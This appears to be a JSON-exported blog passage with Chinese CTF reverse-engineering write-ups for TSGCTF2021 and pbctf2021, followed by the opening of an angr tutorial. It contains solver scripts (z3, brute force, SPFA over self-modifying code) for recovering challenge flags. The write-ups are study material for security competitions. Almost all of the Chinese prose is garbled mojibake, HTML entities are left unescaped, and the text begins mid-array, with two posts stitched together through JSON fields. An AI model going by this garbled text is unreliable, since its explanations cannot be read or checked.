0x066, 0x112, 0x04c, 0x0d8, 0x07d, 0x007, 0x003, 0x0ee, 0x0b4, 0x125, 0x038, 0x0f4, 0x00c, 0x03f, 0x0fc, 0x136, 0x159, 0x08d, 0x062, 0x002, 0x008, 0x0ab, 0x05f, 0x10d, 0x028, 0x102, 0x127, 0x151, 0x10e, 0x01a, 0x062, 0x148, 0x06f, 0x11e, 0x0eb, 0x078, 0x00f, 0x034, 0x05f, 0x165, 0x001, 0x0c1, 0x10c, 0x08e, 0x01d, 0x09a, 0x163, 0x009, 0x00c, 0x091, 0x0ae, 0x114, 0x0b6, 0x0f5, 0x045, 0x08c, 0x04f, 0x060, 0x063, 0x071, 0x0a7, 0x062, 0x0c5, 0x01b, 0x052, 0x12f, 0x0bb, 0x123, -1, ] enc = [ 185, 180, 193, 107, 325, 148, 254, 342, 56, 160, 338, 143, 58, 289, 362, 248, 319, 339, 92, 66, 248, 72, 21, 229, 122, 206, 101, 235, 113, 100, 45, 262 ] for i in range(len(enc)): s = Solver() a1 = Int(\u0026#34;a1\u0026#34;) s.add(a1 \u0026gt;= 0) s.add(a1 \u0026lt;= 128) v6 = time[i + 2] v8 = key[i + 3] * ((a1 + key[i + 0]) % 367 * key[i + 1] % 367 * v6 % 367) % 367 v9 = time[i + 4] v11 = time[i + 7] v12 = (95 + (((v9 * v8 % 367 + 367 - key[i + 5]) % 367 + 367 - key[i + 6]) % 367)) % 367 v13 = key[i + 9] * ((key[i + 8] + v11 * v12 % 367) % 367) v15 = time[i + 10] v16 = v13 % 367 v17 = v15 * v16 v19 = time[i + 11] v21 = (key[i + 16] + (key[i + 15] + key[i + 14] * (((key[i + 12] + v17 % 367 * v19 % 367) % 367 + 367 - key[i + 13]) % 367) % 367) % 367) % 367 v22 = time[i + 17] v24 = (key[i + 19] + key[i + 18] * (v21 * v22 % 367) % 367) % 367 v25 = time[i + 20] v26 = key[i + 28] + key[i + 27] * (((key[i + 25] + (key[i + 24] + key[i + 22] * ((v24 * v25 % 367 + 367 - key[i + 21]) % 367) % 367 * key[i + 23] % 367) % 367) % 367 + 367 - key[i + 26]) % 367) % 367 v28 = time[i + 30] v29 = 95 + v26 % 367 * key[i + 29] % 367 - 367 * ((95 + (v26 % 367 * key[i + 29] % 367)) / 367) v30 = (v29 * v28 % 367 + 367 - key[i + 31]) % 367 + 367 - key[i + 32] v32 = time[i + 33] v34 = key[i + 35] * ((key[i + 34] + v30 % 367 * v32 % 367) % 367) % 367 * key[i + 36] % 367 v35 = time[i + 37] v37 = (key[i + 43] * (((((key[i + 38] * (v34 * v35 % 367) % 367 + 367 - key[i + 39]) % 367 + 367 - key[i + 40]) % 367 + 367 - key[i + 41]) % 367 + 367 - key[i + 42]) % 0x16F) % 0x16F + key[i + 44]) % 0x16F v38 = time[i + 45] v40 = (key[i + 46] + (v37 * v38) % 367) % 367 v41 = time[i + 47] v43 = (key[i + 49] + (key[i + 48] + v40 * v41 % 367) % 367) % 367 v44 = time[i + 50] v46 = key[i + 55] * ((key[i + 54] + ((key[i + 52] + (key[i + 51] + v43 * v44 % 367) % 367) % 367 + 367 - key[i + 53]) % 367) % 367) % 367 v47 = time[i + 56] v49 = (v46 * v47 % 367 + 367 - key[i + 57]) % 367 v50 = time[i + 58] v52 = ((95 + v49 * v50 % 367) % 367 + key[i + 59]) % 367 v53 = time[i + 60] v54 = (key[i + 63] + key[i + 62] * ((key[i + 61] + v52 * v53 % 367) % 367) % 367) % 367 * key[i + 64] % 367 + 367 - key[i + 65] v56 = time[i + 67] v57 = v56 * ((key[i + 66] + v54 % 367) % 367) v59 = time[i + 68] v61 = (key[i + 69] * (v57 % 367 * v59 % 367) % 367 + 367 - key[i + 70]) % 367 v62 = time[i + 71] v64 = (key[i + 73] * (key[i + 72] * (v61 * v62 % 367) % 367) % 367 + 367 - key[i + 74]) % 367 v65 = time[i + 75] v67 = (v64 * v65 % 367 + 367 - key[i + 76]) % 367 v68 = time[i + 77] v70 = ((key[i + 79] + (v67 * v68 % 367 + 367 - key[i + 78]) % 367) % 367 + 367 - key[i + 80]) % 367 v71 = time[i + 81] v73 = key[i + 85] * (((key[i + 82] * (v70 * v71 % 367) % 367 + 367 - key[i + 83]) % 367 + 367 - key[i + 84]) % 367) % 367 v74 = time[i + 86] v76 = (v73 * v74 % 367 + 367 - key[i + 87]) % 367 v77 = time[i + 88] v78 = key[i + 90] * (((95 + v76 * v77 % 367) % 367 + 367 - key[i + 89]) % 367) v79 = time[i + 98] v82 = time[i + 99] v84 = ((v82 * ((v79 * (((((((v78 % 367 + 367 - key[i + 91]) % 367 * key[i + 92] % 367 + 367 - key[i + 93]) % 367 + 367 - key[i + 94]) % 367 + 367 - key[i + 95]) % 367 + 367 - key[i + 96]) % 0x16F + key[i + 97]) % 0x16F)) % 367) % 367 + 367 - key[i + 100]) % 367 + 367 - key[i + 101]) % 367 + 367 - key[i + 102] v85 = time[i + 108] v86 = 95 + ((((v84 % 367 + 367 - key[i + 103]) % 0x16F + key[i + 104]) % 0x16F + 367 - key[i + 105]) % 0x16F * key[i + 106] % 0x16F + 367 - key[i + 107]) % 0x16F - 367 * ((95 + (((((v84 % 367 + 367 - key[i + 103]) % 0x16F + key[i + 104]) % 0x16F + 367 - key[i + 105]) % 0x16F * key[i + 106] % 0x16F + 367 - key[i + 107]) % 0x16F)) / 367) v87 = key[i + 113] * (((((key[i + 109] + v86 * v85 % 367) % 367 + 367 - key[i + 110]) % 367 + 367 - key[i + 111]) % 367 + 367 - key[i + 112]) % 367) v89 = time[i + 114] v90 = v89 * (v87 % 367) v92 = time[i + 115] v93 = v90 % 367 * v92 v95 = time[i + 117] v97 = (key[i + 118] + (key[i + 116] + v93 % 367) % 367 * v95 % 367) % 367 v98 = time[i + 119] v100 = v97 * v98 % 367 v101 = time[i + 120] v103 = (v100 * v101 % 367 + 367 - key[i + 121]) % 367 v104 = time[i + 122] v105 = (key[i + 124] * ((key[i + 123] + v103 * v104 % 367) % 367) % 367 + 367 - key[i + 125]) % 367 * key[i + 126] v107 = time[i + 127] s.add(enc[i] == ((v105 % 367 * v107 % 367) + 95) % 367) if s.check() == sat: print (chr(s.model()[a1].as_long()), end = \u0026#39;\u0026#39;) else: print (\u0026#34;unsat\u0026#34;) print () è·‘å¾—å€’æ˜¯æŒºå¿«ï¼Œå°±æ˜¯ä¸€è¡Œä¸€è¡Œå¤åˆ¶æœ‰ç‚¹ç´¯\u0026hellip;\nnatural flag processing é˜Ÿå‹æŸ¥çœ‹äº†outçš„å‚æ•°ï¼Œå‘ç°åªæœ‰ç¬¬314ä½ä¸º1ï¼Œäºæ˜¯çŒœæµ‹åªè¦æ»¡è¶³ç¬¬314ä½è¾“å‡ºå¤§äº0ï¼Œå°±é€šè¿‡éªŒè¯äº†ï¼ˆåœ¨ forward() å‡½æ•°é‡ŒåŠ ä¸€è¡Œå°±éªŒè¯äº†ï¼‰\nå…ˆåªè¾“å…¥ TSGCTF{ æµ‹è¯•äº†ä¸€ä¸‹ï¼Œç„¶åæƒŠå¥‡åœ°å‘ç°ï¼Œæ¯æ¬¡è¿è¡Œå®Œ forward() åï¼Œéƒ½ä¼šæœ‰ä¸€ä½å¤§äº0ï¼Œäºæ˜¯çŒœæµ‹é”™è¯¯çš„è¾“å…¥ä¼šä½¿å¾—å¤§äº0çš„ä½æ¶ˆå¤±ï¼Œä¸”æ¶ˆå¤±åæ— æ³•å†å¾—åˆ°å¤§äº0ï¼Œè¿™æ ·å°±å¯ä»¥çˆ†ç ´äº†ï¼Œå¤§äº0çš„æ•°å­—æ¶ˆå¤±å°±å‰ªæ‰\né˜Ÿå‹ç”¨dfsï¼Œæˆ‘å°±ç”¨äº†bfsï¼Œä¸»è¦å°±æ˜¯åœ¨ä¹‹å‰çš„ä»£ç ä¸Šè¿›è¡Œä¸€äº›é­”æ”¹ï¼ˆæ„Ÿè§‰è¿™ä¸ªæ›´åƒmiscå•Šï¼‰\nimport string import torch from torch import nn FLAG_CHARS = string.ascii_letters + string.digits + \u0026#34;{}-\u0026#34; CHARS = \u0026#34;^$\u0026#34; + FLAG_CHARS def sanity_check(text): global FLAG_CHARS assert text[:7] == \u0026#34;TSGCTF{\u0026#34; assert text[-1:] == \u0026#34;}\u0026#34; assert all([t in FLAG_CHARS for t in text]) def embedding(text): global CHARS x = torch.zeros((len(text), len(CHARS))) for i, t in enumerate(text): x[i, CHARS.index(t)] = 1.0 return x class Model(nn.Module): def __init__(self, inpt, hidden): super().__init__() self.cell = nn.RNNCell(inpt, hidden) self.out = nn.Linear(hidden, 1) def forward(self, xs): count = 0 h = None global baopo global cur # print (xs) # print (\u0026#39;-------------------------------\u0026#39;) for x in xs[:-1]: count += 1 h = self.cell(x, h) if (len((h \u0026gt; 0).nonzero()) != 0): print (cur) baopo.append(cur) x = xs[-1] h = self.cell(x, h) return self.out(h) count = 0 def inference(model, text): model.eval() with torch.no_grad(): x = embedding(\u0026#34;^\u0026#34;+text+\u0026#34;$\u0026#34;).unsqueeze(1) y = model(x)[0].sigmoid().cpu().item() return y # baopo = [\u0026#39;mRNA-st4nDs-f0r-mANuaLLy-tun3d-RecurrEn7-N3uRAl-AutoM4toN}\u0026#39;] baopo = [\u0026#39;m\u0026#39;] while True: i = baopo.pop(0) for j in FLAG_CHARS: model = Model(len(CHARS), 520) model.load_state_dict(torch.load(\u0026#34;model_final.pth\u0026#34;)) # text = input(\u0026#34;input flag:\u0026#34;) # sanity_check(text) # for i in range(400): text = \u0026#39;TSGCTF{\u0026#39; + i + j # print (i, j) cur = i + j res = inference(model, text) if res \u0026gt; 0.5: print(\u0026#34;Congrats!\u0026#34;) exit(0) # print (cur) # else: # print (res) # print(\u0026#34;Wrong.\u0026#34;) çˆ†ç ´çš„æ—¶é—´æœ‰ç‚¹ä¹…\n*optimized è¿™é“é¢˜çš„UPXç‰¹å¾è¢«å®Œå…¨å»é™¤äº†ï¼Œä»¥è‡³äºæ¯”èµ›çš„æ—¶å€™åªçœ‹å‡ºæ¥äº†æ˜¯ä¸ªå£³ï¼Œä½†æ²¡å‘ç°æ˜¯UPXå£³ï¼ˆå…¶å®çŒœåˆ°äº†ï¼Œä½†elfå°±æœ‰ç‚¹æ‡’äº†\u0026hellip;ï¼‰\nåªéœ€è¦æ‰“å¼€010ï¼Œå°†æ‰€æœ‰çš„ tsg_ ä¿®æ”¹ä¸º UPX! å°±è¡Œ\nè„±å£³åå‘ç°å°±æ˜¯ç®€å•çš„æ•°å­¦çº¦æŸï¼Œä¾‹å¦‚\n_mm_movemask_epi8( _mm_cmpeq_epi8( _mm_slli_si128((__m128i)0x9569uLL, 8), _mm_slli_si128( (__m128i)(((0x2AF91 * (unsigned __int128)(0x5F50DDCA7B17LL * (unsigned __int64)v8)) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF), 8))) == 0xFFFF å»å®˜ç½‘æŸ¥äº†ä¸€ä¸‹å‡½æ•°çš„å®šä¹‰ï¼Œå°±æ˜¯è¦æ±‚\n(__m128i)(((0x2AF91 * (unsigned __int128)(0x5F50DDCA7B17LL * (unsigned __int64)v8)) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF) == (__m128i)0x9569uLL æœ¬æ¥æƒ³ç”¨cæˆ–è€…æ±‡ç¼–çš„ï¼Œä½†128ä½ä¸€ç›´ä¼šæœ‰ä¸€äº›é—®é¢˜ï¼Œäºæ˜¯åªå¥½ç”¨pythonäº†\u0026hellip;\nfor i in range(0, 0xffffffff): if (0x9569 == (((i * 0x5F50DDCA7B17 \u0026amp; 0xffffffffffffffff) * 0x2AF91) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF) and (0x26CF2 == (((i * 0x4DC4591DAC8F \u0026amp; 0xffffffffffffffff) * 0x34AB9) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF): print (f\u0026#39;v8 = {i}\u0026#39;, hex(i)) if (0x20468 == (((i * 0x4AE11552DF1A \u0026amp; 0xffffffffffffffff) * 0x36B39) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF) and (0x3787A == (((i * 0x46680B140EFF \u0026amp; 0xffffffffffffffff) * 0x3A2D3) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF): print (f\u0026#39;v9 = {i}\u0026#39;, hex(i)) if (i * 0x4D935BBD3E0 \u0026amp; 0xffffffffffffffff \u0026lt; 0x4D935BBD3E0) and (0x5563 == (((i * 0x66B9B431B9ED \u0026amp; 0xffffffffffffffff) * 0x27DF9) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF): print (f\u0026#39;v10 = {i}\u0026#39;, hex(i)) if (i * 0x1E5D2BE81C5 \u0026amp; 0xffffffffffffffff \u0026lt; 0x1E5D2BE81C5) and (0x133E7 == (((i * 0x448626500938 \u0026amp; 0xffffffffffffffff) * 0x3BC65) \u0026gt;\u0026gt; 64) \u0026amp; 0x3FFFF): print (f\u0026#39;v11 = {i}\u0026#39;, hex(i)) if (i \u0026amp; 0xffffff == 0): print (f\u0026#39;time: {hex(i)}\u0026#39;) è·‘äº¿ä¼šå°±è¡Œ\n$ ./optimized-unpacked Enter password: 772928896 2204180909 4273479145 1334930147 TSGCTF{F457_m0dul0!}@ pbctf2021 cosmo mainå‡½æ•°åœ¨ sub_403066\nè¦æ±‚é•¿åº¦æ˜¯38ï¼Œç®€å•çœ‹äº†ä¸€ä¸‹åŠ å¯†é€»è¾‘ï¼Œå‘ç°æ˜¯ä¸¤ä¸ªå­—ç¬¦ä¸€èµ·åŠ å¯†å¹¶éªŒè¯ï¼Œè¿˜æƒ³ç”¨pintoolsè¯•è¯•ï¼Œç»“æœå‘ç°æ ¹æœ¬è·‘ä¸èµ·æ¥\näºæ˜¯åˆå¼€å§‹äº†å¿«ä¹çš„æ‰‹å†™çˆ†ç ´ï¼Œä¸è¿‡è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼ŒåŠ¨è°ƒä¸€ä¸‹å°±çŸ¥é“åªç”¨äº†æœ€ä¸‹é¢çš„å‡ è¡ŒåŠ å¯†é€»è¾‘\n#include \u0026lt;stdio.h\u0026gt; long long qword_40C000[20] = { 21233875ll, 69468586ll, 146735755ll, 251265871ll, 379651085ll, 536872170ll, 719455639ll, 924911196ll, 1158088491ll, 1412368333ll, 1695680674ll, 2005272944ll, 2341407284ll, 2698316511ll, 3076262773ll, 3483634782ll, 3913551105ll, 72486322ll, 548474478ll, 0ll }; long long encrypt(char *a, int len, int cur){ int v5 = len; int res = 0; long long v3 = qword_40C000[cur - 1]; int v6 = v3 \u0026gt;\u0026gt; 16; int v7 = v3 \u0026amp; 0xffff; while(v5){ v7 += *a; v6 += v7; --v5; ++a; } if (v7 \u0026gt; 0xFFF0) v7 -= 0xFFF1; return v7 | ((v6 % 0xFFF1) \u0026lt;\u0026lt; 16); } int test_cnt(int cnt){ for (int i = 0x20; i \u0026lt; 0x80; i++){ for (int j = 0x20; j \u0026lt; 0x80; j++){ char a[] = {i, j}; if (encrypt(a, 2, cnt) == qword_40C000[cnt]){ printf(\u0026#34;%c%c\u0026#34;, i, j); return 0; } } } } int main(){ printf(\u0026#34;pbctf{\u0026#34;); for (int i = 3; i \u0026lt; 19; i++) test_cnt(i); printf(\u0026#34;\\n\u0026#34;); return 0; } é™¤äº†æ‰¾mainå‡½æ•°ä¹‹å¤–ä¹Ÿæ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„\nBinaryTree è¿™é¢˜é€»è¾‘è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„ï¼Œå°±æ˜¯æ ¹æ®800bitçš„è¾“å…¥è¿›è¡Œäº†800å±‚SMC\næ¯ä¸€å±‚éƒ½ä¼šå¯¹å¯„å­˜å™¨è¿›è¡Œä¸€ä¸ªåŠ æ³•ï¼Œç„¶åå†³å®šä¸‹ä¸€ä¸ªSMCçš„ç»“æœï¼Œå¤§æ¦‚æ˜¯\njz Label mov r8, [rdi + 0x____] ; å…·ä½“å¯„å­˜å™¨å¿˜äº†ï¼Œéšä¾¿å†™äº†ä¸ªï¼Œä¸­é—´ä¸€å †nopçœç•¥äº† add r9, 0x__ Label: mov r8, [rdi + 0x____] add r9, 0x__ jmp SMC æœ€åä¸€å±‚å°±æ˜¯å¯¹å¯„å­˜å™¨è¿›è¡Œcmpï¼Œå°äºç­‰äºæŸä¸ªå€¼å°±è¡Œ\nä¸€å¼€å§‹è¿˜æƒ³ç€å‡ºé¢˜äººä»æ…ˆä¸€ç‚¹ï¼Œè´ªå¿ƒå°±æ˜¯æœ€å°ï¼ˆæƒ³ç›´æ¥ç”¨idapythonè‡ªåŠ¨è·‘ï¼‰ï¼Œç»“æœç›´æ¥gg\né˜Ÿå‹å¯¹æ¯ä¸€å±‚çš„å¯èƒ½æ€§è¿›è¡Œäº†éå†ï¼Œå‘ç°æ¯ä¸€å±‚æœ€å¤šæœ‰16ç§å¯èƒ½\näºæ˜¯è¿™é¢˜å°±æˆäº†æœ‰å‘æ— ç¯å›¾æ±‚å•æºæœ€çŸ­è·¯å¾„\næ±‚è§£ä»£ç å¯ä»¥åˆ†æˆä¸‰ä¸ªéƒ¨åˆ†ï¼šä»SMCç»“æœæå–å…³é”®æ•°æ®ï¼Œå»ºå›¾ï¼Œè·‘SPFA\nå…¶ä¸­SPFAæ˜¯æŠ„çš„ï¼Œè·¯å¾„è¾“å‡ºç¨å¾®ä¿®æ”¹ä¸€ä¸‹å°±è¡Œ\n#include \u0026lt;algorithm\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;queue\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;cstdlib\u0026gt; #include \u0026lt;cstdio\u0026gt; #include \u0026lt;cmath\u0026gt; #include \u0026lt;cstring\u0026gt; using namespace std; #define INF 0xfffffff #define MAXN 16 * 800 + 5 struct Cur_smc{ char bytecode[0x30]; int depth; int len[2]; }; Cur_smc cur_smc_code[MAXN]; char smc_xor_code[0xFFFFF]; struct Edge{ int to; int len; int path; Edge(int to, int len, int path): to(to), len(len), path(path) {} }; vector \u0026lt;Edge\u0026gt; G[MAXN]; int dist[MAXN]; int FLAG_exist; bool my_strncmp(char *a, char *b, int length){ for (int i = 0; i \u0026lt; length; ++i){ if (a[i] != b[i]) return false; } return true; } int analysis_next(int cur, int direction){ // direction == 0 for bellow, direction == 1 for above int i = 0; while (cur_smc_code[cur].bytecode[i] == \u0026#39;\\x90\u0026#39;){ ++i; } // pass \u0026#34;nop\u0026#34; int end_left = 0; unsigned int index_xor = 0; int START = 0; int END = 0; if (cur_smc_code[cur].bytecode[i] == \u0026#39;\\x74\u0026#39;) // always starts as \u0026#34;jz label1\u0026#34; end_left = cur_smc_code[cur].bytecode[++i] + (++i); if (direction == 1){ // if input bit is 1 START = 0; END = end_left; } else if (direction == 0){ // if input bit is 0 START = end_left; END = 0x20; } for (i = START; i \u0026lt; END; ++i){ // read \u0026#34;add r9, xx\u0026#34; if (cur_smc_code[cur].bytecode[i] == \u0026#39;\\x49\u0026#39; \u0026amp;\u0026amp; cur_smc_code[cur].bytecode[i + 1] == \u0026#39;\\x83\u0026#39; \u0026amp;\u0026amp; cur_smc_code[cur].bytecode[i + 2] == \u0026#39;\\xC1\u0026#39;) cur_smc_code[cur].len[direction] = cur_smc_code[cur].bytecode[i + 3]; // read next key to SMC if (cur_smc_code[cur].bytecode[i] == \u0026#39;\\x48\u0026#39; \u0026amp;\u0026amp; cur_smc_code[cur].bytecode[i + 1] == \u0026#39;\\x8D\u0026#39; \u0026amp;\u0026amp; cur_smc_code[cur].bytecode[i + 2] == \u0026#39;\\x5F\u0026#39;) index_xor = cur_smc_code[cur].bytecode[i + 3] \u0026amp; 0xff; if (cur_smc_code[cur].bytecode[i] == \u0026#39;\\x48\u0026#39; \u0026amp;\u0026amp; cur_smc_code[cur].bytecode[i + 1] == \u0026#39;\\x8D\u0026#39; \u0026amp;\u0026amp; cur_smc_code[cur].bytecode[i + 2] == \u0026#39;\\x9F\u0026#39;){ index_xor = cur_smc_code[cur].bytecode[i + 3] \u0026amp; 0xff; index_xor |= (cur_smc_code[cur].bytecode[i + 4] \u0026amp; 0xff) \u0026lt;\u0026lt; 8; index_xor |= (cur_smc_code[cur].bytecode[i + 5] \u0026amp; 0xff) \u0026lt;\u0026lt; 16; index_xor |= (cur_smc_code[cur].bytecode[i + 6] \u0026amp; 0xff) \u0026lt;\u0026lt; 24; } } char next_smc[0x30]; memset(next_smc, 0, sizeof(next_smc)); for (i = 0; i \u0026lt; 0x20; i++){ next_smc[i] = (char)(cur_smc_code[cur].bytecode[i] ^ smc_xor_code[index_xor + i]); } int next_depth = cur_smc_code[cur].depth + 1; for (i = (next_depth - 1) * 16; i \u0026lt; (next_depth) * 16; ++i){ if (cur_smc_code[i].depth == 0){ break; } if (my_strncmp(next_smc, cur_smc_code[i].bytecode, 0x20)){ FLAG_exist = 0; return i; } } FLAG_exist = 1; for (int j = 0; j \u0026lt; 0x20; j++){ cur_smc_code[i].bytecode[j] = next_smc[j]; } cur_smc_code[i].depth = next_depth; if (next_depth == 801){ FLAG_exist = 0; } return i; } void set_up_map(){ queue \u0026lt;int\u0026gt; Q; Q.push(0); while (!Q.empty()){ int tmp = Q.front(); Q.pop(); int left = analysis_next(tmp, 1); G[tmp].push_back(Edge(left, cur_smc_code[tmp].len[1], 1)); if (FLAG_exist) Q.push(left); int right = analysis_next(tmp, 0); G[tmp].push_back(Edge(right, cur_smc_code[tmp].len[0], 0)); if (FLAG_exist) Q.push(right); } return; } int Path[MAXN], flag[MAXN]; bool vis[MAXN]; void Spfa(int Start) { dist[Start] = 0; queue\u0026lt;Edge\u0026gt; Q; Q.push(Edge(Start, 0, 0)); while( !Q.empty() ) { Edge P = Q.front(); Q.pop(); vis[P.to] = true; int len = G[P.to].size(); for(int i=0; i\u0026lt;len; i++) { Edge Pn = G[P.to][i]; if(dist[Pn.to] \u0026gt; dist[P.to] + Pn.len) { dist[Pn.to] = dist[P.to] + Pn.len; Path[Pn.to] = P.to; flag[Pn.to] = Pn.path; if( !vis[Pn.to] ) { Q.push(Pn); vis[Pn.to] = true; } } } } } void PutPath(int Star,int End) { if(Star == End) return ; PutPath(Star, Path[End]); printf(\u0026#34;%d\u0026#34;, flag[End]); } void Init() { for(int i = 0; i \u0026lt; MAXN; i++) { G[i].clear(); dist[i] = INF; vis[i] = false; Path[i] = i; } FILE *fp = fopen(\u0026#34;smc_code.txt\u0026#34;, \u0026#34;r\u0026#34;); for (int i = 0; i \u0026lt; 0xC73E0; ++i){ smc_xor_code[i] = fgetc(fp); } } int main(){ Init(); printf(\u0026#34;\\n\u0026#34;); memcpy(cur_smc_code[0].bytecode, \u0026#34;\\x90\\x74\\x0D\\x48\\x8D\\x5F\\x40\\x90\\x49\\x83\\xC1\\x49\\xEB\\xC5\\x90\\x90\\x48\\x8D\\x5F\\x20\\x90\\x90\\x90\\x49\\x83\\xC1\\x11\\x90\\x90\\x90\\xEB\\xB3\u0026#34;, 0x21); cur_smc_code[0].depth = 1; set_up_map(); Spfa(0); printf(\u0026#34;%x\\n\u0026#34;, dist[16 * 800]); PutPath(0, 16 * 800); return 0; } å¥½ä¹…æ²¡æœ‰ç”¨cå†™è¿™äº›ä¸œè¥¿äº†ï¼Œä¸€å¼€å§‹å…¨æ˜¯bugï¼ˆ\nswitchingitup é¢˜ç›®æè¿°å°±è¯´äº†æ˜¯ python 3.10.0ï¼Œä¸€å¼€å§‹è¿˜ä»¥ä¸ºæ²¡å•¥åŒºåˆ«ï¼Œç»“æœå‘ç°pycdasåªæ”¯æŒåˆ°äº†3.9ï¼Œ3.10è¿åæ±‡ç¼–éƒ½å‡ºä¸æ¥ï¼Œå¥½åœ¨pycdcçš„pull requestsé‡Œæœ‰äººæäº¤äº†ä¸€ä»½3.10çš„ï¼ˆç°åœ¨å·²ç»æ›´æ–°äº†ï¼‰å·®ç‚¹è€ƒè™‘è‡ªå·±é­”æ”¹pycdcäº†\n3.10åŠ äº†ä¸€äº›æ–°ä¸œè¥¿ï¼Œä¸€å¼€å§‹ä¸çŸ¥é“çœ‹å¾—å¾ˆç—›è‹¦ï¼Œåæ¥æŸ¥åˆ°ä¹‹åæ„Ÿè§‰å°±ä¸éš¾äº†\nä¸Šä¸€ä¸‹ç›®å‰æ‰‹åŠ¨åç¼–è¯‘çš„ç»“æœ\nimport dis def test_func(): @__import__(\u0026#39;dataclasses\u0026#39;).dataclass class a1: x: int y: str def key(v1): for e in v1: yield e ^ 1337 def gene(a): for e in a: yield e a1 = a1() a3 = bytes(key(iter((1385, 1403, 1402, 1389, 1407)))) a6 = __import__(\u0026#39;hashlib\u0026#39;).md5 I = input(\u0026#34;flag? \u0026#34;) a4 = lambda x: a6(x).hexdigest() a5 = list(I) a2 = {} a7 = -1 while a5: match a5: case [\u0026#39;p\u0026#39;, \u0026#39;b\u0026#39;, \u0026#39;c\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;f\u0026#39;, \u0026#39;{\u0026#39;, *R, \u0026#39;}\u0026#39;]: a7 = a7 + 1 a2 |= {0:112} if a7 or len(R) != 32 else {} a5 = list(gene(enumerate(R))) case a1(x, y): a7 = a7 + 1 a2 |= {x:y} if x + 1 != a7 or a4(a3 * x)[x] != y else {} case _: a2 |= {1:125} break print(\u0026#39;Correct\u0026#39; if not a2 else \u0026#39;Nope\u0026#39;) print (dis.dis(test_func)) æ–°çš„ç‰¹æ€§å°±æ˜¯ match case è¯­å¥ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¾ˆå®ç”¨çš„ï¼Œå­¦åˆ°äº†\nç›®å‰è¿˜æœ‰å‡ ä¸ªåœ°æ–¹ä¸å¤ªçŸ¥é“æ€ä¹ˆå†™çš„\nä¸€ä¸ªæ˜¯ a2 |= {} if () else {} è¿™é‡Œï¼Œé¢˜ç›®é‡Œåº”è¯¥æ˜¯æŠŠ a7=a7+1 æ”¾åˆ°äº†è¿™ä¸€è¡Œé‡Œ\nè¿˜æœ‰ä¸€ä¸ªæ˜¯ GET_ITER å’Œ FOR_ITER åœ¨è¿­ä»£éƒ¨åˆ†æ˜¯åˆ†å¼€çš„ï¼Œä¸å¤ªæ‡‚äº†\nä¸è¿‡ä»¿ç…§è¿™è¿™ä¸ªé€»è¾‘å†™æœ‰äº›é—®é¢˜\nè§£å†³æ–¹æ¡ˆå°±æ˜¯ç›´æ¥åœ¨ .pyc æ–‡ä»¶é‡ŒåŠ ä¸€ä¸ªè¾“å‡ºï¼Œa4(a3 * x)[x] != y ç»™è¿™ä¸ªé€»è¾‘å¥—ä¸Šè¾“å‡ºå°±è¡Œï¼Œæ”¹å®Œåçš„pyasmæ–‡ä»¶é•¿è¿™æ ·ï¼š\n276 LOAD_NAME 12: a2 278 LOAD_NAME 13: a7 280 LOAD_CONST 21: 1 282 BINARY_ADD 284 DUP_TOP 286 STORE_NAME 13: a7 288 LOAD_NAME 18: x 290 LOAD_CONST 21: 1 292 BINARY_ADD 294 COMPARE_OP 3 (!=) 296 POP_JUMP_IF_TRUE 159 (to 318) --\u0026gt; LOAD_NAME 20: print 298 LOAD_NAME 9: a4 300 LOAD_NAME 4: a3 302 LOAD_NAME 18: x 304 BINARY_MULTIPLY 306 CALL_FUNCTION 1 308 LOAD_NAME 18: x 310 BINARY_SUBSCR --\u0026gt; CALL_FUNCTION 1 312 LOAD_NAME 19: y 314 COMPARE_OP 3 (!=) 316 POP_JUMP_IF_FALSE 163 (to 326) ç„¶åè¿˜æœ‰æ‰‹åŠ¨ä¿®æ”¹ä¸€ä¸‹å„ä¸ª jump çš„ç›®çš„åœ°å€ï¼Œæœ€åçš„äºŒè¿›åˆ¶æ–‡ä»¶é•¿è¿™æ ·\nè¿è¡Œä¸€ä¸‹å°±æœ‰ç»“æœäº†\n","date":"2021-10-09T22:22:33Z","image":"/post/tsgctf2021-and-pbctf2021-re-writeups/cover_hu1d6e6a8c7a63b9144fd12b4cc4fa1275_1804782_120x120_fill_q75_box_smart1.jpg","permalink":"/post/tsgctf2021-and-pbctf2021-re-writeups/","title":"TSGCTF2021 and pbctf2021 RE writeups"},{"content":"å¼€å§‹å­¦angr\nå°±æ˜¯åœ¨æŠ„solution\nfind from angr import * proj = Project(\u0026#39;./00_angr_find\u0026#39;, load_options={\u0026#39;auto_load_libs\u0026#39;: False}, main_opts={\u0026#39;base_addr\u0026#39;:0x8048000}) state = proj.factory.entry_state() simgr = proj.factory.simgr(state) find_addr = 0x8048675 simgr.explore(find = find_addr) if simgr.found: simulations = simgr.found[0] print (simulations.posix.dumps(0)) else: print (\u0026#39;no result\u0026#39;) å…ˆç”¨ Project å¯¼å…¥äºŒè¿›åˆ¶æ–‡ä»¶\nç„¶å state ä¸ºå¼€å§‹æ¨¡æ‹Ÿæ—¶çš„çŠ¶æ€ï¼Œentry_state ä¸ºä»å…¥å£ç‚¹å¼€å§‹æ¨¡æ‹Ÿ\nsimgr æ˜¯ä¸º simulation_manager å¯¼å…¥è¿™ä¸ªçŠ¶æ€ï¼Œè¿›è¡Œæ¨¡æ‹Ÿæ‰§è¡Œ\nexplore ä¸ºæ¨¡æ‹Ÿå™¨è®¾å®šäº†ä¸€ä¸ªæ‰§è¡Œçš„ç›®æ ‡ï¼Œé‡åˆ°avoidå°†åœæ­¢æ‰§è¡Œï¼Œé‡åˆ°findåˆ™ä¼šæ·»åŠ åˆ°foundçŠ¶æ€ä¸­ï¼Œè¿™é‡Œå¡«å†™çš„æ˜¯è¾“å‡º Success å­—ç¬¦ä¸²çš„åœ°å€\næœ€åä»foundä¸­dumpså‡ºæ ‡å‡†è¾“å…¥çš„å€¼ï¼Œå°±å¯ä»¥æ‹¿åˆ°flag\navoid from angr import * base_addr = 